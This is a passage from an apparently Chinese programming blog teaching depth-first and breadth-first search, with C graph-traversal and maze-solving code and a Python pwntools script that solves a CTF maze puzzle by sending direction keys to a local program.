vexs[MAXVEX]; <span class="comment">/* 顶点表 */</span></span><br><span class="line">EdgeType arc[MAXVEX][MAXVEX];<span class="comment">/* 邻接矩阵，可看作边表 */</span></span><br><span class="line"><span class="keyword">int</span> numVertexes, numEdges; <span class="comment">/* 图中当前的顶点数和边数 */</span></span><br><span class="line">&#125;MGraph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> mark[MAXVEX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateMGraph</span><span class="params">(MGraph* G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">G-&gt;numEdges = <span class="number">15</span>;</span><br><span class="line">G-&gt;numVertexes = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读入顶点信息，建立顶点表 */</span></span><br><span class="line">G-&gt;vexs[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">1</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">3</span>] = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">4</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">5</span>] = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">6</span>] = <span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">7</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">G-&gt;vexs[<span class="number">8</span>] = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numVertexes; i++)<span class="comment">/* 初始化图 */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G-&gt;numVertexes; j++)</span><br><span class="line">&#123;</span><br><span class="line">G-&gt;arc[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">0</span>][<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">1</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">2</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">3</span>][<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">4</span>][<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">G-&gt;arc[<span class="number">4</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">5</span>][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">G-&gt;arc[<span class="number">6</span>][<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numVertexes; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &lt; G-&gt;numVertexes; j++)</span><br><span class="line">&#123;</span><br><span class="line">G-&gt;arc[j][i] = G-&gt;arc[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(MGraph G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.numVertexes; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (mark[i] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nsecess!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(MGraph G,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line">mark[i] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, G.vexs[i]);</span><br><span class="line">check(G);</span><br><span class="line"><span class="keyword">for</span> (m = <span class="number">0</span>; m&lt;G.numVertexes; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (mark[m] != <span class="number">1</span> &amp;&amp; G.arc[i][m]==<span class="number">1</span>)<span class="comment">//满足未被访问过，并且互相相连的条件，就继续搜索。</span></span><br><span class="line">&#123;</span><br><span class="line">dfs(G, m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MGraph G;</span><br><span class="line">CreateMGraph(&amp;G);</span><br><span class="line">dfs(G,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有种很典型的迷宫dfs例子，ctf中也经常用到，下面代码写的比较重复，是可以用一个for循环来代替的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">5</span>][<span class="number">5</span>] = &#123; &#123;<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;2&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;#&#x27;</span>&#125;, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mark[<span class="number">5</span>][<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> way[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>[x][y] == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;way: %s\n&quot;</span>, way);</span><br><span class="line"><span class="comment">//exit(0);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> xnew=<span class="number">0</span>, ynew=<span class="number">0</span>;</span><br><span class="line">check(x, y);<span class="comment">//判断走到终点。</span></span><br><span class="line"></span><br><span class="line">xnew = x - <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">5</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">5</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)<span class="comment">//不能越界，不能撞墙，不能走以访问路线。</span></span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;w&#x27;</span>;<span class="comment">//保存路线，以便输出路线。</span></span><br><span class="line">mark[x][y] = <span class="number">1</span>;<span class="comment">//标记以访问路线，避免重复访问。</span></span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;<span class="comment">//如果该路不能到达终点，回溯时要将标记还原。</span></span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;<span class="comment">//路线走不通，还原。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">5</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">5</span>  &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x + <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">5</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">5</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">5</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">5</span>  &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">dfs(<span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>极客巅峰一道maze题也用到了dfs，python写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./maze1&#x27;</span>)</span><br><span class="line"><span class="built_in">next</span> = [[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>],[<span class="number">0</span>, <span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>]]</span><br><span class="line">way = <span class="string">&quot;SADW&quot;</span></span><br><span class="line">back = &#123;<span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putstr</span>(<span class="params">a</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ans += i</span><br><span class="line">    print(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">x, y, step</span>):</span></span><br><span class="line">    putstr(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        xnew = x + <span class="built_in">next</span>[i][<span class="number">0</span>]</span><br><span class="line">        ynew = y + <span class="built_in">next</span>[i][<span class="number">1</span>]</span><br><span class="line">        flag[step] = way[i]</span><br><span class="line">        flag[step+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (maze[xnew][ynew] == <span class="number">1</span> <span class="keyword">or</span> mark[xnew][ynew]==<span class="number">1</span>):<span class="comment">#如果该方向为墙或者已经走过，直接下一轮循环。</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io.sendline(way[i])<span class="comment">#发送当前循环的方向</span></span><br><span class="line">        ans = io.readline()<span class="comment">#得到反馈字符串</span></span><br><span class="line">        <span class="keyword">if</span> (ans == <span class="string">b&#x27;1\n&#x27;</span>):<span class="comment">#如果是正确方向</span></span><br><span class="line">            maze[xnew][ynew] = <span class="number">0</span></span><br><span class="line">            mark[x][y] = <span class="number">1</span><span class="comment">#标记旧位置，防止回走</span></span><br><span class="line">            dfs(xnew, ynew, step + <span class="number">1</span>)</span><br><span class="line">            io.sendline(back[way[i]])<span class="comment">#如果该路尽头走不通，开始回走，直到找到有多个方向的那个节点。因为迷宫可能有多条路线，某些路线是错的，而且这个程序走错是不会改变位置的，回走就会改变位置，所以回走时要反方向sendline</span></span><br><span class="line">            io.readline()<span class="comment">#将回走的反馈接收</span></span><br><span class="line">            mark[x][y] = <span class="number">0</span><span class="comment">#重新标记为0</span></span><br><span class="line">        <span class="keyword">elif</span>(ans[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">b&quot;Good&quot;</span>):<span class="comment">#终点判定</span></span><br><span class="line">            print(<span class="string">&quot;success&quot;</span>,end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            putstr(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[xnew][ynew] = <span class="number">1</span><span class="comment">#将该方向判定为墙</span></span><br><span class="line"></span><br><span class="line">maze = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]<span class="comment">#初始化迷宫地图</span></span><br><span class="line">mark = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]<span class="comment">#初始化走过的地方，注意这只是一条路线，不包括错误路线，若想要知道所有走过的地方，可再添加一个二维数组。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;This is the beginning. You can only go south.\n&quot;</span>)</span><br><span class="line">dfs(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>)<span class="comment">#避免边界，可以从偏中间的位置开始，只不过出题人也考虑了的，从左上开始走是没有问题的。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.广度优先bfs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;io.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;math.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;<span class="comment">/* Status是函数的类型,其值是函数结果状态代码，如OK等 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Boolean; <span class="comment">/* Boolean是布尔类型,其值是TRUE或FALSE */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> VertexType; <span class="comment">/* 顶点类型应由用户定义 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> EdgeType; <span class="comment">/* 边上的权值类型应由用户定义 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 9 <span class="comment">/* 存储空间初始分配量 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXEDGE 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVEX 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INFINITY 65535</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">VertexType vexs[MAXVEX]; <span class="comment">/* 顶点表 */</span></span><br><span class="line">EdgeType arc[MAXVEX][MAXVEX];<span class="comment">/* 邻接矩阵，可看作边表 */</span></span><br><span class="line"><span class="keyword">int</span> numVertexes, numEdges; <span class="comment">/* 图中当前的顶点数和边数 */</span></span><br><span class="line">&#125;MGraph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> mark[MAXVEX] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">/* --------------------------队列------------------------------- */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data[max];</span><br><span class="line"><span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">int</span> last;<span class="comment">//代表放入数据的后一个下标</span></span><br><span class="line">&#125;Queue;</span><br><span class="line"><span class="function"><span class="keyword">void</span> 